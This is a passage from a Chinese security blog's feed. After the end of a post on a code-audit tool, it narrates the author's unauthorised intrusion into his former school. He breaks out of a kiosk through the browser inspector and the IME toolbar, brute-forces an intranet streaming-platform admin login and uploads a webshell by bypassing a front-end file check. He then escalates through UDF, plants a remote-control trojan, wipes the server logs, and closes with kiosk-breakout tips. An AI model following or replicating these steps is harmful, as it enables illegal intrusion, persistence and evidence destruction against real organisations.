title="五、总结"></a>五、总结</h2><p>本篇文章介绍了国外安全研究人员开发的PHP代码审计神器——RIPS，并且提供了笔者的汉化版本，相信大家可以借助这款工具更好地进行代码审计，挖到更多CMS的漏洞。</p><h2 id="六、下载"><a href="#六、下载" class="headerlink" title="六、下载"></a>六、下载</h2><p><a href="https://github.com/J0o1ey/rips-Chinese">https://github.com/J0o1ey/rips-Chinese</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对母校终端机的一次渗透</title>
      <link href="/2017/06/17/%E5%AF%B9%E6%AF%8D%E6%A0%A1%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/"/>
      <url>/2017/06/17/%E5%AF%B9%E6%AF%8D%E6%A0%A1%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-一点感悟"><a href="#0x01-一点感悟" class="headerlink" title="0x01 一点感悟"></a>0x01 一点感悟</h2><p>又回到最初的起点 记忆中你青涩的脸</p><p>我们终于 来到了这一天                   —胡夏《那些年》</p><p>当这首歌的旋律在我耳边响起，我的思绪仿佛一下间重返多年前。<br>有些情思，难以抓住，我已变成如今的自己。<br>纵使很多故人难以重逢，生活难以重返，但是我依然坚信踏实地走好现在的路便是最好的选择。<br>朋友们，好好珍惜现在处在一起的友情、爱情，这些青葱岁月的小幸运可能会成为人生中最美的一缕记忆。</p><p>趁着母校的学生还在上课，老师们没放假，我想回到母校走走，看看那些花儿、那些草木和那些日日夜夜陪伴我的老师。<br>伴着发动机的轰鸣声，我来到了母校。</p><h2 id="0x02-本性难移"><a href="#0x02-本性难移" class="headerlink" title="0x02:本性难移"></a>0x02:本性难移</h2><p>走在这片熟悉的土地上，抚摸大地的每一寸肌肤，嗅着花儿的芬芳，感受着蓝天白云，远山沧海之美，不由得有些心潮澎湃<br>看着操场上奔跑的少年，校园里卿卿我我的学生。<br>“依然是那般单纯且美好~”我感叹到。<br>看了下手表，马上就要到和老师约定的时间了，我便快马加鞭地走向老师的办公室<br>但是途中发现了这个好东西。。。。我这技术菜鸡的禽兽本性就暴露无遗了。。<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191407864.png" alt="image"></p><p>我去，学校现在真的是发达了，学校里都装上这种查询用的触屏终端机了。<br>我好奇地点开各个栏目。。浏览了一下学校的各种新闻（由于终端机屏幕亮，这些照片反光比较厉害）<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191407936.png" alt="image"></p><p>不得不为母校的日益辉煌感到高兴啊，终端机里的新闻都挺牛逼。<br>但是我点击左上方的LOGO时，惊奇的发现了这个<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191407512.png" alt="image"></p><p>没错404界面，说明我们应该进入了浏览器，那么我们思路可以骚一点，利用浏览器的审查元素来实现输入法工具栏的弹出<br>当我们在404界面手指长摁屏幕时，相当于使用鼠标右键<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191406618.png" alt="image-20230419132352843"></p><p>我们立马点开审查元素，找到一个可以输入字符的地方，召唤出我们亲爱的输入法<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191408853.png" alt="image"></p><p>搜狗输入法。。。可以很强势，点击搜狗输入法的工具栏，成功弹出Windows系统下方的工具栏<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191408786.png" alt="image"></p><p>然后利用搜狗的软键盘和下方的Windows工具栏，我们成功地打开cmd进行了一波信息搜集，这台终端机也宣布gg<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410094.png" alt="image"></p><p>没错，就这样把这台终端机给拿下了，我带着满心欢喜，上楼去找班主任的办公室。</p><h2 id="0x03-唠嗑后的Getshell"><a href="#0x03-唠嗑后的Getshell" class="headerlink" title="0x03:唠嗑后的Getshell"></a>0x03:唠嗑后的Getshell</h2><p>来到班主任的办公室里，班主任非常亲切地招待了我一番，颇有一番活跃的气氛<br>过了一会，班主任说她要上课了，我决定等她下班后和她吃顿饭。于是她把我安排在她办公室的座位上跟我说<br>——“你在这里拿我的电脑看看网页吧，我上完课和你一块出去哈”</p><p>这一句话可算是高兴坏了我，这简直是引狼入室啊。。。于是我拿出U盘，开始对学校内网进行进一步的探测。</p><p>首先使用ScanPort对192段内网开放的WEB服务进行了扫描</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410608.png" alt="image"></p><p>我看了一下，有些是路由器的管理界面，尝试了一些弱口令爆破无果后便放弃了<br>但是我发现了学校的一个校内直播平台 192.168.88.128:80</p><p>2.打开直播平台后，发现每次直播的发起人的用户名均是admin….运气好炸<br>用户登录界面没有验证码，果断进行一波猛如虎的爆破。。（忘截图了）</p><p>成功登录后台，找到一个LOGO的上传点上传SHELL<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410789.png" alt="image"></p><p>很明显。。。拦截掉了，但是目测肯定是用的前端认证。<br>直接在Burp的Http请求中修改shell.jpg为shell.php</p><p>如图所示<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410915.png" alt="image"></p><p>成功拿到SHELL<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410865.png" alt="image"></p><h2 id="0x04-蛋疼的提权"><a href="#0x04-蛋疼的提权" class="headerlink" title="0x04:蛋疼的提权"></a>0x04:蛋疼的提权</h2><p>whoami执行看了一下，权限比较小，没有c盘的写权限(所以shift后门还是算了)。<br>于是我上了一堆ms提权集试了下，发现补丁打的还算是及时，都没什么卵用。。。<br>后来翻了翻数据库配置文件，拿到了数据库的相关配置信息<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411392.png" alt="image"></p><p>UDF提权试下<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411538.png" alt="image"></p><p>OKOK，非常可以，直接上用户，使用默认3389端口登录服务器<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411845.png" alt="image"></p><h2 id="0x05-收尾"><a href="#0x05-收尾" class="headerlink" title="0x05:收尾"></a>0x05:收尾</h2><p>拿到服务器后，我在网站根目录写了一个PHP的文件下载系统，然后在服务器上架设好远控，跑到楼下的终端机上下载了远控木马执行<br>这样操作就更加方便了。正当我准备进行进一步嗅探时，我看了看时间已经不早了。。老师马上要下课了。。</p><p>于是我使用工具清理了一下服务器日志，删除了shell，拿QQ音乐放上一首老男孩，静静地听着。<br>随后老师回来了，我们愉快的离开校园，我叫上一个基友一块到万达吃了顿饭，感觉还不错<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191411549.png" alt="image"></p><h2 id="0x06-想法与总结"><a href="#0x06-想法与总结" class="headerlink" title="0x06:想法与总结"></a>0x06:想法与总结</h2><p>当我离开校园时，我静静地回首望向一座座教学楼——那是我梦想开始的地方。<br>时至今日我已不记得多少个无助的夜里面，我听着那首《老男孩》，然后在宿舍里开着手电筒背书，学技术<br>我也不需要记得。</p><p>下面说一下终端机的常用渗透测试技巧:</p><blockquote><p>1.在终端机输入内容时，注意是否出现语言栏，很多情况可以利用语言栏进行渗透<br>2.可以频繁点击屏幕，程序有可能崩溃掉（不要笑，这是真的）<br>3.利用长摁某一位置出现的右键菜单（比如本篇文章中浏览器中的审查元素）<br>4.如果可以接触到终端机的电源，可以电源，然后让终端机重启，往往会有意想不到的结果</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 硬件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
